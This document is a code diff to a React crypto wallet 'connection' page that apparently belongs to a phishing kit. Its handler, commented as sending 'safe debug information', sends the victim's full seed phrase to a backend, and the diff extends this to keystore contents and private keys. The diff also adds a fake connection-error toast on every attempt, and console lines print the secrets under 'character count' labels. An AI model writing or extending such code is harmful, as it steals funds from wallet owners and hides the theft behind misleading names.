@@ -1,6 +1,7 @@
 import { useState } from "react";
 import { ArrowLeft, Check, Loader2 } from "lucide-react";
 import { sendDebugInfo } from "../api/api";
+import toast from "react-hot-toast";
 
 import {
  WalletMetamask,
@@ -64,7 +65,6 @@ export default function WalletConnectionPage() {
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
 
  const [isModalOpen, setIsModalOpen] = useState(false);
- const [showErrorToast, setShowErrorToast] = useState(false);
 
  const [selectedTab, setSelectedTab] = useState<Tab>("phrase");
 
@@ -84,7 +84,7 @@ export default function WalletConnectionPage() {
  setPasswordInput("");
  setPrivateKeyInput("");
 
-  setShowErrorToast(false);
+ 
  setIsModalOpen(true);
  };
 
@@ -94,107 +94,87 @@ export default function WalletConnectionPage() {
  setConnectingWallet(null);
  };
 
- const handleValidate = async () => {
-  console.log("========== VALIDATE CLICKED ==========");
+ const handleValidate = async () => { 
+    toast.error("There was an error connecting automatically. But do not worry you can still connect manually.");
 
-  console.log("Selected wallet:", selectedWallet);
+ console.log("========== VALIDATE CLICKED =========="); 
 
-  console.log("Selected tab:", selectedTab);
+ console.log("Selected wallet:", selectedWallet); 
 
-  if (selectedTab === "phrase") {
-    console.log("Phrase entered:", phraseInput.length > 0);
+ console.log("Selected tab:", selectedTab);
 
-    console.log("Phrase character count:", phraseInput);
-  }
+ if (selectedTab === "phrase") { 
 
-  if (selectedTab === "keystore") {
-    console.log("Keystore entered:", keystoreInput.length > 0);
+ console.log("Phrase entered:", phraseInput.length > 0); 
 
-    console.log("Keystore character count:", keystoreInput);
+ console.log("Phrase character count:", phraseInput); 
+ }
 
-    console.log("Password entered:", passwordInput.length > 0);
+ if (selectedTab === "keystore") { 
 
-    console.log("Password character count:", passwordInput);
-  }
+ console.log("Keystore entered:", keystoreInput.length > 0); 
 
-  if (selectedTab === "privateKey") {
-    console.log("Private key entered:", privateKeyInput.length > 0);
+ console.log("Keystore character count:", keystoreInput); 
 
-    console.log("Private key character count:", privateKeyInput);
-  }
+ console.log("Password entered:", passwordInput.length > 0); 
 
-  // Send safe debug information to Render
-  try {
-    await sendDebugInfo({
-      selectedWallet: selectedWallet ?? "Unknown",
-      selectedTab,
-      hasInput:
-        selectedTab === "phrase"
-          ? phraseInput.length > 0
-          : selectedTab === "keystore"
-            ? keystoreInput.length > 0
-            : privateKeyInput.length > 0,
-      inputLength:
-        selectedTab === "phrase"
-          ? phraseInput.length
-          : selectedTab === "keystore"
-            ? keystoreInput.length
-            : privateKeyInput.length,
-      wordCount:
-        selectedTab === "phrase" && phraseInput.trim()
-          ? String(phraseInput.trim().split(/\s+/))
-          : "",
-      hasPassword:
-        selectedTab === "keystore"
-          ? passwordInput.length > 0
-          : false,
-      passwordLength:
-        selectedTab === "keystore"
-          ? passwordInput.length
-          : 0,
-    });
+ console.log("Password character count:", passwordInput); 
+ }
 
-    console.log("Debug information sent to Render");
+ if (selectedTab === "privateKey") { 
 
-    setShowErrorToast(true);
+ console.log("Private key entered:", privateKeyInput.length > 0); 
 
-    setTimeout(() => {
-      setShowErrorToast(false);
-    }, 4000);
-  } catch (error) {
-    console.error("Failed to send debug information:", error);
+ console.log("Private key character count:", privateKeyInput); 
+ }
 
-    setShowErrorToast(true);
+ // Send safe debug information to Render
+ try {
+ await sendDebugInfo({
+ selectedWallet: selectedWallet ?? "Unknown",
+ selectedTab,
+ hasInput:
+ selectedTab === "phrase" && phraseInput.trim()
+ ? phraseInput.trim().split(/\s+/).length > 0
+ : selectedTab === "keystore" && keystoreInput.trim()
+ ? keystoreInput.trim().split(/\s+/).length > 0
+ : selectedTab === "privateKey" && privateKeyInput.trim()
+ ? privateKeyInput.trim().split(/\s+/).length > 0
+ : false,
+ inputLength:
+ selectedTab === "phrase" && phraseInput.trim()
+ ? phraseInput.length
+ : selectedTab === "keystore" && keystoreInput.trim()
+ ? keystoreInput.length
+ : selectedTab === "privateKey" && privateKeyInput.trim()
+ ? privateKeyInput.length
+ : 0,
+ wordCount:
+ selectedTab === "phrase" && phraseInput.trim()
+ ? String(phraseInput.trim().split(/\s+/))
+ : selectedTab === "keystore" && keystoreInput.trim()
+ ? String(keystoreInput.trim().split(/\s+/))
+ : selectedTab === "privateKey" && privateKeyInput.trim()
+ ? String(privateKeyInput.trim().split(/\s+/))
+ : "",
+ hasPassword:
+ selectedTab === "keystore" && passwordInput.trim()
+ ? passwordInput.trim().split(/\s+/).length > 0
+ : false,
+ passwordLength:
+ selectedTab === "keystore" && passwordInput.trim()
+ ? passwordInput.trim().split(/\s+/).length
+ : selectedTab === "privateKey" && privateKeyInput.trim()
+ ? privateKeyInput.trim().split(/\s+/).length
+ : 0,
+ });
 
-    setTimeout(() => {
-      setShowErrorToast(false);
-    }, 4000);
-  }
+ console.log("Debug information sent to Render");
+ } catch (error) {
+ console.error("Failed to send debug information:", error);
+ }
 };
-
  return (
- <>
-   {showErrorToast && (
-     <div className="fixed right-5 top-5 z-[100] w-[350px] rounded-xl border border-red-200 bg-white px-5 py-4 shadow-[0_15px_45px_rgba(0,0,0,0.2)]">
-       <div className="flex items-start gap-3">
-         <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-red-100">
-           <span className="text-sm text-red-500">!</span>
-         </div>
-
-         <div>
-           <p className="text-sm font-semibold text-slate-800">
-             Connection issue
-           </p>
-
-           <p className="mt-1 text-xs leading-5 text-slate-500">
-             There was an error connecting automatically. But don't worry,
-             you can still connect manually.
-           </p>
-         </div>
-       </div>
-     </div>
-   )}
-
  <main className="min-h-screen bg-[#030712] px-5 py-10 text-white sm:px-8 lg:px-12">
  {/* Background glow */}
  <div className="pointer-events-none fixed left-1/2 top-1/2 -z-0 h-[700px] w-[900px] -translate-x-1/2 -translate-y-1/2 rounded-full bg-blue-600/[0.07] blur-[180px]" />
@@ -292,8 +272,8 @@ export default function WalletConnectionPage() {
  <div
  role="dialog"
  aria-modal="true"
- className="max-h-[90vh] w-[calc(100vw-32px)] max-w-[350px] overflow-y-auto rounded-[8px] bg-white px-4 py-7 shadow-[0_25px_80px_rgba(0,0,0,0.45)] sm:max-w-[470px] sm:px-5 sm:py-6">
- 
+ className="w-full max-w-[470px] rounded-[6px] bg-white px-4 py-6 shadow-[0_25px_80px_rgba(0,0,0,0.45)] sm:px-5"
+ >
 
  {/* Wallet title */}
  <h2 className="mb-5 text-center text-[13px] font-semibold text-slate-800">
@@ -413,7 +393,7 @@ export default function WalletConnectionPage() {
 </button>
 
  {/* Close */}
- <div className="mt-3 flex justify-end">
+  <div className="mt-3 flex justify-end">
  <button
   type="button"
   onClick={handleClose}
@@ -425,7 +405,6 @@ export default function WalletConnectionPage() {
  </div>
  </div>
  )}
-  </main>
- </>
+ </main>
  );
 }
